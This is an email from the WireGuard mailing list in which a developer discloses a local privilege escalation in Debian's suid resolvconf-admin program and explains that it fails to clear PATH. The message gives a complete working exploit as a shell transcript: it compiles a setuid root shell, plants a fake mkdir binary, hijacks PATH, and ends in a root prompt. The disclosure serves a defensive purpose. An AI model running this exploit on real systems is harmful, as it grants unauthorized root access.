Return-Path: Jason@zx2c4.com
Received: from krantz.zx2c4.com (localhost [127.0.0.1])
 by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 7daf64c5
 for <wireguard@lists.zx2c4.com>;
 Sun, 29 Oct 2017 22:04:24 +0000 (UTC)
Received: from frisell.zx2c4.com (frisell.zx2c4.com [192.95.5.64])
 by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id adaf536d
 for <wireguard@lists.zx2c4.com>;
 Sun, 29 Oct 2017 22:04:24 +0000 (UTC)
Received: by frisell.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 70967b54
 for <wireguard@lists.zx2c4.com>;
 Sun, 29 Oct 2017 22:04:24 +0000 (UTC)
Received: by frisell.zx2c4.com (ZX2C4 Mail Server) with ESMTPSA id 5e3d9282
 (TLSv1.2:ECDHE-RSA-AES128-GCM-SHA256:128:NO)
 for <wireguard@lists.zx2c4.com>;
 Sun, 29 Oct 2017 22:04:24 +0000 (UTC)
Received: by mail-oi0-f51.google.com with SMTP id n82so18456563oig.3
 for <wireguard@lists.zx2c4.com>; Sun, 29 Oct 2017 15:06:32 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <87ineze3x2.fsf@fifthhorseman.net>
References: <CAHmME9q0m1rEfc_CFsb3qv6oQ97QOjtPDxe6yY+D+0aAApE9Yg@mail.gmail.com>
 <3a761178-19bc-1d01-b6a8-9fb801312d47@solidadmin.com>
 <CAHmME9q3g3622k6C+pcvb_EpA9NdedTmmE59vohUR3nF3fyuvg@mail.gmail.com>
 <44ac12fe-685b-730e-8afd-e4081daf038d@solidadmin.com>
 <CAHmME9oSNNG7-CrC5Emuvi33JD=PBD4rXkwoJABnUcn6-oh6yg@mail.gmail.com>
 <92b6b9c5-b07c-52fa-a72a-0fc2dcc253bc@solidadmin.com>
 <CAHmME9pn977yhsu-rVdR-Mz+ZnsrUaxjQYxc2SveYL9zKNXB4w@mail.gmail.com>
 <87she4fdol.fsf@fifthhorseman.net>
 <CAHmME9r0ji7bE4kzJ6964y8kzt061rUOLFKGfCJbpO19sTOMRw@mail.gmail.com>
 <87ineze3x2.fsf@fifthhorseman.net>
From: "Jason A. Donenfeld" <Jason@zx2c4.com>
Date: Sun, 29 Oct 2017 23:06:31 +0100
Message-ID: <CAHmME9rpVS84KzU4a76tKLPVQ0MfjegvQhLzrF6z=F5Um8128g@mail.gmail.com>
Subject: Re: Fixing wg-quick's DNS= directive with a hatchet
To: Daniel Kahn Gillmor <dkg@fifthhorseman.net>
Content-Type: text/plain; charset="UTF-8"
Cc: WireGuard mailing list <wireguard@lists.zx2c4.com>
List-Id: Development discussion of WireGuard <wireguard.lists.zx2c4.com>
List-Unsubscribe: <https://lists.zx2c4.com/mailman/options/wireguard>,
 <mailto:wireguard-request@lists.zx2c4.com?subject=unsubscribe>
List-Archive: <http://lists.zx2c4.com/pipermail/wireguard/>
List-Post: <mailto:wireguard@lists.zx2c4.com>
List-Help: <mailto:wireguard-request@lists.zx2c4.com?subject=help>
List-Subscribe: <https://lists.zx2c4.com/mailman/listinfo/wireguard>,
 <mailto:wireguard-request@lists.zx2c4.com?subject=subscribe>

On Sat, Oct 28, 2017 at 4:35 PM, Daniel Kahn Gillmor
<dkg@fifthhorseman.net> wrote:
> I actually shipped the resolvconf-admin package in debian to provide
> some kind of filtering interface to avoid total garbage from the network
> getting accidentally passed through to arbitrary resolvconf plugins.

By the way, the program you wrote introduces a trivial local privilege
escalation vulnerability into Debian, since not all available
providers of the resolvconf binary set PATH themselves. Always clear
environment variables yourself before exec'ing anything in an suid
executable. Here's an exploit:

unpriv@scw-968260:~$ id
uid=1000(unpriv) gid=1000(unpriv) groups=1000(unpriv),114(resolvconf-admins)

unpriv@scw-968260:~$ stat /usr/bin/resolvconf-admin
  File: /usr/bin/resolvconf-admin
  Size: 24736           Blocks: 56         IO Block: 4096   regular file
Device: fd00h/64768d    Inode: 2897743     Links: 1
Access: (4754/-rwsr-xr--)  Uid: (    0/    root)   Gid: (
114/resolvconf-admins)
Access: 2017-10-29 21:56:25.709185001 +0000
Modify: 2017-10-29 21:55:04.529185001 +0000
Change: 2017-10-29 21:55:41.449185001 +0000
 Birth: -

unpriv@scw-968260:~$ echo 'main() { setuid(0); setgid(0);
execl("/bin/sh", 0); }' > a.c && gcc -o rootshell a.c

unpriv@scw-968260:~$ echo "main() { chown(\"$PWD/rootshell\", 0, 0);
chmod(\"$PWD/rootshell\", 04755); }" > a.c && gcc -o mkdir a.c

unpriv@scw-968260:~$ export PATH="$PWD:$PATH"

unpriv@scw-968260:~$ resolvconf-admin add eth0 8.8.8.8
Cannot write to /run/resolvconf/lock

unpriv@scw-968260:~$ ./rootshell
# id
uid=0(root) gid=0(root) groups=0(root),114(resolvconf-admins),1000(unpriv)
